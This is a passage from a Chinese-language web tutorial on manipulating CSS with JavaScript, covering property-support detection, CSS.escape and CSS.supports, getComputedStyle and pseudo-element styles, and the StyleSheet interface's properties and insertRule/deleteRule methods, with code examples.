<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> content = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"><span class="keyword">typeof</span> content.<span class="property">style</span>[<span class="string">&#x27;webkitAnimation&#x27;</span>] === <span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>这种侦测方法可以写成一个函数。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isPropertySupported</span>(<span class="params">property</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (property <span class="keyword">in</span> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">var</span> prefixes = [<span class="string">&#x27;Moz&#x27;</span>, <span class="string">&#x27;Webkit&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;ms&#x27;</span>, <span class="string">&#x27;Khtml&#x27;</span>];</span><br><span class="line">  <span class="keyword">var</span> prefProperty = property.<span class="title function_">charAt</span>(<span class="number">0</span>).<span class="title function_">toUpperCase</span>() + property.<span class="title function_">substr</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; prefixes.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>((prefixes[i] + prefProperty) <span class="keyword">in</span> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">isPropertySupported</span>(<span class="string">&#x27;background-clip&#x27;</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h3 id="4、原生CSS-对象"><a href="#4、原生CSS-对象" class="headerlink" title="4、原生CSS 对象"></a>4、原生CSS 对象</h3><p><strong>浏览器原生提供 CSS 对象，为 JavaScript 操作 CSS 提供一些工具方法。</strong></p>
<p>这个对象目前有两个静态方法。</p>
<h4 id="4-1-CSS-escape-转义CSS选择器里的特殊字符"><a href="#4-1-CSS-escape-转义CSS选择器里的特殊字符" class="headerlink" title="4.1 CSS.escape() 转义CSS选择器里的特殊字符"></a>4.1 CSS.escape() 转义CSS选择器里的特殊字符</h4><p><code>CSS.escape</code>方法<strong>用于转义 CSS 选择器里面的特殊字符。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;foo#bar&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，该元素的<code>id</code>属性包含一个<code>#</code>号，该字符在 CSS 选择器里面有特殊含义。不能直接写成<code>document.querySelector(&#39;#foo#bar&#39;)</code>，只能写成<code>document.querySelector(&#39;#foo\\#bar&#39;)</code>。这里必须使用双斜杠的原因是，单引号字符串本身会转义一次斜杠。</p>
<p><code>CSS.escape</code>方法就用来转义那些特殊字符。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#&#x27;</span> + <span class="variable constant_">CSS</span>.<span class="built_in">escape</span>(<span class="string">&#x27;foo#bar&#x27;</span>)) </span><br><span class="line"><span class="comment">//CSS.escape(&#x27;foo#bar&#x27;)转义成foo\#bar</span></span><br></pre></td></tr></table></figure>



<h4 id="4-2-CSS-supports-当前环境是否支持某一句-CSS-规则"><a href="#4-2-CSS-supports-当前环境是否支持某一句-CSS-规则" class="headerlink" title="4.2 CSS.supports() 当前环境是否支持某一句 CSS 规则"></a>4.2 CSS.supports() 当前环境是否支持某一句 CSS 规则</h4><p><code>CSS.supports</code>方法<strong>返回一个布尔值，表示当前环境是否支持某一句 CSS 规则</strong>。</p>
<p>它的参数有两种写法，一种是第一个参数是属性名，第二个参数是属性值；另一种是整个参数就是一行完整的 CSS 语句。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种写法</span></span><br><span class="line"><span class="variable constant_">CSS</span>.<span class="title function_">supports</span>(<span class="string">&#x27;transform-origin&#x27;</span>, <span class="string">&#x27;5px&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line"><span class="variable constant_">CSS</span>.<span class="title function_">supports</span>(<span class="string">&#x27;display: table-cell&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>注意，第二种写法的参数结尾不能带有分号，否则结果不准确。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">CSS</span>.<span class="title function_">supports</span>(<span class="string">&#x27;display: table-cell;&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>



<h3 id="5、window-getComputedStyle-返回元素最终样式"><a href="#5、window-getComputedStyle-返回元素最终样式" class="headerlink" title="5、window.getComputedStyle() 返回元素最终样式"></a>5、window.getComputedStyle() 返回元素最终样式</h3><p>行内样式（inline style）具有最高的优先级，改变行内样式，通常会立即反映出来。但是，网页元素最终的样式是综合各种规则计算出来的。因此，如果想得到元素实际的样式，只读取行内样式是不够的，需要得到浏览器最终计算出来的样式规则。</p>
<p><code>window.getComputedStyle</code>方法，就用来<strong>返回浏览器计算后得到的最终样式规则</strong>。它接受一个元素节点对象作为参数，返回一个 CSSStyleDeclaration 实例，包含了指定节点的最终样式信息。所谓“最终样式信息”，指的是各种 CSS 规则叠加后的结果。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> styleObj = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(div);</span><br><span class="line">styleObj.<span class="property">backgroundColor</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，得到的背景色就是<code>div</code>元素真正的背景色。</p>
<p>注意，CSSStyleDeclaration 实例是一个<strong>活的对象</strong>，任何对于样式的修改，会实时反映到这个实例上面。另外，这个实例是<strong>只读的</strong>。</p>
<p><code>getComputedStyle</code>方法还可以接受第二个参数，表示当前元素的伪元素（比如<code>:before</code>、<code>:after</code>、<code>:first-line</code>、<code>:first-letter</code>等）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(div, <span class="string">&#x27;:before&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>下面的例子是如何获取元素的高度。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> elem = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;elem-container&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> styleObj = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(elem, <span class="literal">null</span>)</span><br><span class="line"><span class="keyword">var</span> height = styleObj.<span class="property">height</span>; <span class="comment">// 得到元素最终渲染出来的高度，最可靠</span></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> height = styleObj[<span class="string">&#x27;height&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> height = styleObj.<span class="title function_">getPropertyValue</span>(<span class="string">&#x27;height&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码得到的<code>height</code>属性，是浏览器最终渲染出来的高度，比其他方法得到的高度更可靠。由于<code>styleObj</code>是 CSSStyleDeclaration 实例，所以可以使用各种 CSSStyleDeclaration 的实例属性和方法。</p>
<p>有几点需要注意。</p>
<ul>
<li>CSSStyleDeclaration 实例返回的 CSS 值都是绝对单位。比如，<strong>长度都是像素单位</strong>（返回值包括<code>px</code>后缀），<strong>颜色是<code>rgb(#, #, #)</code>或<code>rgba(#, #, #, #)</code>格式</strong>。</li>
<li>CSS 规则的<strong>简写形式无效</strong>。比如，想读取<code>margin</code>属性的值，不能直接读，只能读<code>marginLeft</code>、<code>marginTop</code>等属性；再比如，<code>font</code>属性也是不能直接读的，只能读<code>font-size</code>等单个属性。</li>
<li>如果读取 CSS 原始的属性名，要用方括号运算符，比如<code>styleObj[&#39;z-index&#39;]</code>；如果读取骆驼拼写法的 CSS 属性名，可以直接读取<code>styleObj.zIndex</code>。</li>
<li>该方法返回的 CSSStyleDeclaration 实例的<code>cssText</code>属性无效，返回<code>undefined</code>。</li>
</ul>
<h3 id="6、CSS-伪元素样式的获取"><a href="#6、CSS-伪元素样式的获取" class="headerlink" title="6、CSS 伪元素样式的获取"></a>6、CSS 伪元素样式的获取</h3><p>CSS 伪元素是通过 CSS 向 DOM 添加的元素，主要是通过<code>:before</code>和<code>:after</code>选择器生成，然后用<code>content</code>属性指定伪元素的内容。</p>
<p>下面是一段 HTML 代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span>Test content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>CSS 添加伪元素<code>:before</code>的写法如下。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#test</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;Before &#x27;</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#FF0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**节点元素的<code>style</code>对象无法读写伪元素的样式，这时就要用到<code>window.getComputedStyle()</code>**。JavaScript 获取伪元素，可以使用下面的方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(test, <span class="string">&#x27;:before&#x27;</span>).<span class="property">content</span>;</span><br><span class="line"><span class="keyword">var</span> color = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(test, <span class="string">&#x27;:before&#x27;</span>).<span class="property">color</span>;</span><br></pre></td></tr></table></figure>

<p>此外，<strong>也可以使用 CSSStyleDeclaration 实例的<code>getPropertyValue</code>方法</strong>，获取伪元素的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(test, <span class="string">&#x27;:before&#x27;</span>)</span><br><span class="line">  .<span class="title function_">getPropertyValue</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> color = <span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(test, <span class="string">&#x27;:before&#x27;</span>)</span><br><span class="line">  .<span class="title function_">getPropertyValue</span>(<span class="string">&#x27;color&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="7、StyleSheet-接口"><a href="#7、StyleSheet-接口" class="headerlink" title="7、StyleSheet 接口"></a>7、StyleSheet 接口</h3><h4 id="7-1-概述"><a href="#7-1-概述" class="headerlink" title="7.1 概述"></a>7.1 概述</h4><p><code>StyleSheet</code>接口代表网页的一张样式表，包括<code>&lt;link&gt;</code>元素加载的样式表和<code> &lt;style&gt; </code>元素内嵌的样式表。</p>
<p><strong><code>document</code>对象的<code>styleSheets</code>属性</strong>，可以返回当前页面的所有<code>StyleSheet</code>实例（即<strong>所有样式表</strong>）。它是一个<strong>类似数组的对象</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sheets = <span class="variable language_">document</span>.<span class="property">styleSheets</span>;</span><br><span class="line"><span class="keyword">var</span> sheet = <span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>];</span><br><span class="line">sheet <span class="keyword">instanceof</span> <span class="title class_">StyleSheet</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>如果是<code> &lt;style&gt; </code>元素嵌入的样式表，还有<strong>另一种获取<code>StyleSheet</code>实例的方法</strong>，就是这个节点元素的<code>sheet</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为 &lt;style id=&quot;myStyle&quot;&gt;&lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myStyle&#x27;</span>).<span class="property">sheet</span>;<span class="comment">// 另一种获取styleSheet方式</span></span><br><span class="line">myStyleSheet <span class="keyword">instanceof</span> <span class="title class_">StyleSheet</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>严格地说，<code>StyleSheet</code>接口不仅包括网页样式表，还包括 XML 文档的样式表。所以，<strong>它有一个子类<code>CSSStyleSheet</code><strong>表示网页的 CSS 样式表。我们在网页里面拿到的样式表实例，实际上是<code>CSSStyleSheet</code>的实例。这个</strong>子接口继承了<code>StyleSheet</code>的所有属性和方法</strong>，<strong>并且定义了几个自己的属性</strong>，下面把这两个接口放在一起介绍。</p>
<h4 id="7-2-实例属性"><a href="#7-2-实例属性" class="headerlink" title="7.2 实例属性"></a>7.2 实例属性</h4><p><code>StyleSheet</code>实例有以下属性。</p>
<h5 id="（1）StyleSheet-disabled-样式表是否处于禁用状态，可读写"><a href="#（1）StyleSheet-disabled-样式表是否处于禁用状态，可读写" class="headerlink" title="（1）StyleSheet.disabled 样式表是否处于禁用状态，可读写"></a>（1）StyleSheet.disabled 样式表是否处于禁用状态，可读写</h5><p><code>StyleSheet.disabled</code>返回一个布尔值，表示该样式表是否处于禁用状态。手动设置<code>disabled</code>属性为<code>true</code>，等同于在<code>&lt;link&gt;</code>元素里面，将这张样式表设为<code>alternate stylesheet</code>，即该样式表将不会生效。</p>
<p>注意，<code>disabled</code>属性只能在 JavaScript 脚本中设置，不能在 HTML 语句中设置。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;alternate stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置了alternate stylesheet表示禁用此样式表--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span>&#123;<span class="attribute">font-size</span>: <span class="number">16px</span>;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">styleSheets</span>)</span></span><br><span class="line"><span class="language-javascript">     </span></span><br><span class="line"><span class="language-javascript">     <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     StyleSheetList &#123;&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">		0: CSSStyleSheet &#123;ownerRule: null, type: &quot;text/css&quot;, href: 		&quot;file:///C:/Users/dell/Desktop/css.css&quot;, ownerNode: link, parentStyleSheet: null, …&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">		1: CSSStyleSheet &#123;ownerRule: null, cssRules: CSSRuleList, rules: CSSRuleList, type: &quot;text/css&quot;, href: null, …&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">		length: 2</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     */</span></span></span><br><span class="line"><span class="language-javascript">     </span></span><br><span class="line"><span class="language-javascript">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">disabled</span>) <span class="comment">// false 未禁用？不能判断样式表设置了alternate？</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">disabled</span> = <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">disabled</span>) <span class="comment">// true 已禁用</span></span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="（2）Stylesheet-href-返回样式表的网址"><a href="#（2）Stylesheet-href-返回样式表的网址" class="headerlink" title="（2）Stylesheet.href  返回样式表的网址"></a>（2）Stylesheet.href  返回样式表的网址</h5><p><code>Stylesheet.href</code><strong>返回样式表的网址</strong>。对于内嵌样式表，该属性返回<code>null</code>。该属性<strong>只读</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">href</span></span><br></pre></td></tr></table></figure>



<h5 id="（3）StyleSheet-media-返回一个媒介类数组"><a href="#（3）StyleSheet-media-返回一个媒介类数组" class="headerlink" title="（3）StyleSheet.media 返回一个媒介类数组"></a>（3）StyleSheet.media 返回一个媒介类数组</h5><p><code>StyleSheet.media</code>属性<strong>返回一个类似数组的对象（<code>MediaList</code>实例），成员是表示适用媒介的字符串。</strong>表示当前样式表是用于屏幕（screen），还是用于打印（print）或手持设备（handheld），或各种媒介都适用（all）。该属性只读，默认值是<code>screen</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">media</span>.<span class="property">mediaText</span></span><br><span class="line"><span class="comment">// &quot;all&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>MediaList</code>实例的<code>appendMedium</code>方法，用于增加媒介；<code>deleteMedium</code>方法用于删除媒介。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">media</span>.<span class="title function_">appendMedium</span>(<span class="string">&#x27;handheld&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">media</span>.<span class="title function_">deleteMedium</span>(<span class="string">&#x27;print&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h5 id="（4）StyleSheet-title-返回样式表的title属性"><a href="#（4）StyleSheet-title-返回样式表的title属性" class="headerlink" title="（4）StyleSheet.title 返回样式表的title属性"></a>（4）StyleSheet.title 返回样式表的<code>title</code>属性</h5><p><code>StyleSheet.title</code>属性返回样式表的<code>title</code>属性。</p>
<h5 id="（5）StyleSheet-type-返回样式表的type属性"><a href="#（5）StyleSheet-type-返回样式表的type属性" class="headerlink" title="（5）StyleSheet.type 返回样式表的type属性"></a>（5）StyleSheet.type 返回样式表的<code>type</code>属性</h5><p><code>StyleSheet.type</code>属性返回样式表的<code>type</code>属性，通常是<code>text/css</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">type</span>  <span class="comment">// &quot;text/css&quot;</span></span><br></pre></td></tr></table></figure>



<h5 id="（6）StyleSheet-parentStyleSheet-返回父样式表，当前样式表是通过-import加载才有值，否则null"><a href="#（6）StyleSheet-parentStyleSheet-返回父样式表，当前样式表是通过-import加载才有值，否则null" class="headerlink" title="（6）StyleSheet.parentStyleSheet 返回父样式表，当前样式表是通过@import加载才有值，否则null"></a>（6）StyleSheet.parentStyleSheet 返回父样式表，当前样式表是通过@import加载才有值，否则null</h5><p>CSS 的<code>@import</code>命令允许在样式表中加载其他样式表。<code>StyleSheet.parentStyleSheet</code>属性<strong>返回包含了当前样式表的那张样式表</strong>。如果当前样式表是顶层样式表，则该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stylesheet.<span class="property">parentStyleSheet</span>) &#123;</span><br><span class="line">  sheet = stylesheet.<span class="property">parentStyleSheet</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  sheet = stylesheet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="（7）StyleSheet-ownerNode-返回样式表所在的DOM节点"><a href="#（7）StyleSheet-ownerNode-返回样式表所在的DOM节点" class="headerlink" title="（7）StyleSheet.ownerNode 返回样式表所在的DOM节点"></a>（7）StyleSheet.ownerNode 返回样式表所在的DOM节点</h5><p><code>StyleSheet.ownerNode</code>属性**返回<code>StyleSheet</code>对象所在的 DOM 节点，通常是<code>&lt;link&gt;</code>或<code> &lt;style&gt; </code>**。对于那些由其他样式表引用的样式表，该属性为<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;link rel=&quot;StyleSheet&quot; href=&quot;example.css&quot; type=&quot;text/css&quot; /&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="property">ownerNode</span> <span class="comment">// [object HTMLLinkElement]</span></span><br></pre></td></tr></table></figure>



<h5 id="（8）CSSStyleSheet-cssRules-返回一个包含所有css规则的类数组"><a href="#（8）CSSStyleSheet-cssRules-返回一个包含所有css规则的类数组" class="headerlink" title="（8）CSSStyleSheet.cssRules 返回一个包含所有css规则的类数组"></a>（8）CSSStyleSheet.cssRules 返回一个包含所有css规则的类数组</h5><p><code>CSSStyleSheet.cssRules</code>属性<strong>指向一个类似数组的对象（<code>CSSRuleList</code>实例），里面每一个成员就是当前样式表的一条 CSS 规则。</strong>使用该规则的<code>cssText</code>属性，可以得到 CSS 规则对应的字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sheet = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#styleElement&#x27;</span>).<span class="property">sheet</span>;</span><br><span class="line"></span><br><span class="line">sheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">cssText</span></span><br><span class="line"><span class="comment">// &quot;body &#123; background-color: red; margin: 20px; &#125;&quot;</span></span><br><span class="line"></span><br><span class="line">sheet.<span class="property">cssRules</span>[<span class="number">1</span>].<span class="property">cssText</span></span><br><span class="line"><span class="comment">// &quot;p &#123; line-height: 1.4em; color: blue; &#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>每条 CSS 规则还有一个<code>style</code>属性，指向一个对象，用来<strong>读写具体的 CSS 命令</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cssStyleSheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">cssStyleSheet.<span class="property">cssRules</span>[<span class="number">1</span>].<span class="property">style</span>.<span class="property">color</span> = <span class="string">&#x27;purple&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h5 id="（9）CSSStyleSheet-ownerRule-规则所有者"><a href="#（9）CSSStyleSheet-ownerRule-规则所有者" class="headerlink" title="（9）CSSStyleSheet.ownerRule 规则所有者"></a>（9）CSSStyleSheet.ownerRule 规则所有者</h5><p>有些样式表是通过<code>@import</code>规则输入的，它的<code>ownerRule</code>属性会返回一个<code>CSSRule</code>实例，代表那行<code>@import</code>规则。如果当前样式表不是通过<code>@import</code>引入的，<code>ownerRule</code>属性返回<code>null</code>。</p>
<h4 id="7-3-实例方法"><a href="#7-3-实例方法" class="headerlink" title="7.3 实例方法"></a>7.3 实例方法</h4><h5 id="（1）CSSStyleSheet-insertRule-插入css规则"><a href="#（1）CSSStyleSheet-insertRule-插入css规则" class="headerlink" title="（1）CSSStyleSheet.insertRule() 插入css规则"></a>（1）CSSStyleSheet.insertRule() 插入css规则</h5><p><code>CSSStyleSheet.insertRule</code>方法用于<strong>在当前样式表的插入一个新的 CSS 规则</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sheet = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#styleElement&#x27;</span>).<span class="property">sheet</span>;</span><br><span class="line">sheet.<span class="title function_">insertRule</span>(<span class="string">&#x27;#block &#123; color: white &#125;&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">sheet.<span class="title function_">insertRule</span>(<span class="string">&#x27;p &#123; color: red &#125;&#x27;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>该方法可以接受两个参数，第一个参数是表示 CSS 规则的字符串，这里只能有一条规则，否则会报错。第二个参数是该规则在样式表的插入位置（从0开始），该参数可选，默认为0（即默认插在样式表的头部）。注意，如果插入位置大于现有规则的数目，会报错。</p>
<p>该方法的返回值是新插入规则的位置序号。</p>
<p>注意，浏览器对脚本在样式表里面插入规则有很多<a target="_blank" rel="noopener" href="https://drafts.csswg.org/cssom/#insert-a-css-rule">限制</a>。所以，这个方法最好放在<code>try...catch</code>里使用。</p>
<h5 id="（2）CSSStyleSheet-deleteRule-移除css规则"><a href="#（2）CSSStyleSheet-deleteRule-移除css规则" class="headerlink" title="（2）CSSStyleSheet.deleteRule() 移除css规则"></a>（2）CSSStyleSheet.deleteRule() 移除css规则</h5><p><code>CSSStyleSheet.deleteRule</code>方法用来在样式表里面移除一条规则，它的参数是该条规则在<code>cssRules</code>对象中的位置。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>].<span class="title function_">deleteRule</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h3 id="8、实例：添加样式表"><a href="#8、实例：添加样式表" class="headerlink" title="8、实例：添加样式表"></a>8、实例：添加样式表</h3><p>网页添加样式表有两种方式。一种是添加一张内置样式表，即在文档中添加一个<code> &lt;style&gt; </code>节点。</p>
